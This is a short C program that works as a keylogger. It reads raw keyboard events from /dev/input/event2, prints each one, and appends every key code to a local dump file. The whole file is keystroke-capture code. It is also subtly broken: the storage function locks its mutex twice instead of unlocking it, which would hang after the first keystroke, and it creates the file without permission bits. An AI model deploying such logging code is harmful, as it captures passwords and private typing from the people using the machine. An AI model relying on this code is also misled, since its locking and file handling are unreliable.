#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>
#include <fcntl.h>
#include <pthread.h>

#define KEYBOARDFILE "/dev/input/event2"
#define FILE "test.dump"

pthread_mutex_t mut;
pthread_t th;

char * FILE_NAME = FILE;

int storeKeyStroke(char * c, int len) {
    int ret = -1, file = 0;
    pthread_mutex_lock(&mut);
    if ((file = open(FILE_NAME, O_WRONLY | O_APPEND | O_CREAT)) == -1)
        perror("File error");
    else if ((ret = write(file, c, len)) < 0)
        perror("Write error"), ret = -1;
    close(file);
    pthread_mutex_lock(&mut);
    return ret;
}

int main() {
    int fd;
    struct input_event ie;
    pthread_mutex_init(&mut,NULL);

    if((fd = open(KEYBOARDFILE, O_RDONLY)) == -1) {
        perror("Device error");
        exit(EXIT_FAILURE);
    }

    while(read(fd, &ie, sizeof(struct input_event))) {
        printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n",
               ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);
        char c = ie.code;
        if (storeKeyStroke(&c, 1) < 0) {
            close(fd);
            exit(EXIT_FAILURE);
        }
    }
    close(fd);
    return 0;
}
